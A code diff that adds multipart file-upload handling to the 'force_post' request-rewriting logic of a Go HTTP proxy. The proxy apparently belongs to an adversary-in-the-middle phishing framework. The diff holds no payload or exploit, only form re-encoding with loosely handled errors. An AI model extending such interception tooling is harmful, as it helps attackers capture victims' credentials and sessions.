@@ -33,6 +33,7 @@ import (
 	"time"
 	"mime"
 	"mime/multipart"
+	"net/textproto"
 
 	"golang.org/x/net/proxy"
 
@@ -819,6 +820,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 															break
 														}
 													}
+													for k, _ := range req.MultipartForm.File {
+														if fp_s.key.MatchString(k) {
+															if k_matched > 0 {
+																k_matched -= 1
+															}
+															log.Debug("force_post: [%d] matched - %s", k_matched, k)
+															break
+														}
+													}
 												}
 												if k_matched == 0 {
 													ok_search = true
@@ -854,6 +864,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									w.Write([]byte(v[0]))
+								}
+
+								for k, fheaders := range req.MultipartForm.File {
+									for _, fheader := range fheaders {
+										// cannot call CreateFormFile since it defaults to application/octet-stream
+										h := make(textproto.MIMEHeader)
+										h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, k, fheader.Filename))
+										h.Set("Content-Type", fheader.Header["Content-Type"][0])
+
+										fw, err := mpw.CreatePart(h)
+										if err != nil {
+											log.Error("%s", err)
+										}
+
+										file, err := fheader.Open()
+										if err != nil {
+											log.Error("%v", err)
+										}
+
+										defer file.Close()
+										io.Copy(fw, file)
+									}
 								}
 
 								err = mpw.Close()
